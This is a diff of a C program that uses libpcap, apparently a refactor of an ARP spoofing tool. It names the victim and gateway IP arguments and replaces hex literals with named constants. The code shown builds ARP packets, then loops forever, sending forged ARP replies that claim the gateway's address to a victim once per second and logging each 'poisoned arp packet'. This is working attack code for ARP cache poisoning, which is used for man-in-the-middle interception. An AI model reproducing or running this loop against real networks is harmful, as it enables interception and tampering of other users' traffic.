@@ -137,6 +137,8 @@ int main(int argc, char *argv[])
     }
 
     char *dev = argv[1];
+    char *victim_ip = argv[2];
+    char *gateway_ip = argv[3];
 	char errbuf[PCAP_ERRBUF_SIZE];
 
 // network interface handle open
@@ -158,13 +160,13 @@ int main(int argc, char *argv[])
 
     get_my_mac_addr(dev, eth_h->smac);
     set_cast(eth_h->dmac,BROADCAST);
-    eth_h->type = htons(0x0806);        //network layer protocol set ARP
-
+    eth_h->type = htons(ETHERTYPE_ARP);        //network layer protocol set ARP
+    
 //////////////////////////SET ARP HEADER//////////////////////////
     arp_hdr *arp_h = (arp_hdr *)(packet + sizeof(ether_hdr));
-
-    arp_h->HW_type = htons(0x1);                     //ethernet(MAC) = network link protocol type
-    arp_h->Proto_type = htons(0x0800);               //ipv4(It means.. network protocol for ARP media is ipv4)
+    
+    arp_h->HW_type = htons(ARPHRD_ETHER);                     //ethernet(MAC) = network link protocol type
+    arp_h->Proto_type = htons(ETHERTYPE_IP);               //ipv4(It means.. network protocol for ARP media is ipv4)
     arp_h->HW_addr_len = MAC_ADDR_LEN;               //I set HW Type = MAC so, set HW_addr_len = 6
     arp_h->Proto_addr_len = IP_ADDR_LEN;             //I set NETWORK Type = IPV4 so, set Proto_addr_len = 4
     arp_h->opcode = htons(ARPOP_REQUEST);            //ARP Request
@@ -223,7 +225,7 @@ int main(int argc, char *argv[])
     //arp spoofing
     while(1)
     {
-        convert_str_to_ipaddr(argv[3],arp_h->Sender_Proto_addr);   //arp sender protocol address=>gateway ip addr
+        convert_str_to_ipaddr(gateway_ip, arp_h->Sender_Proto_addr);   //arp sender protocol address=>gateway ip addr
         arp_h->opcode = htons(ARPOP_REPLY);                        //ARP REPLY
 
         if(pcap_sendpacket(handle, packet, 60) == PCAP_ERROR)
@@ -233,7 +235,7 @@ int main(int argc, char *argv[])
         }
 
         printf(">>Send to poisoned arp packet to victim ");
-        printf("%s/",argv[2]);
+        printf("%s/", victim_ip);
         print_mac(arp_h->Target_HW_addr);
         sleep(1);                                                  //RE-send poisoning packet every 1 sec
     }
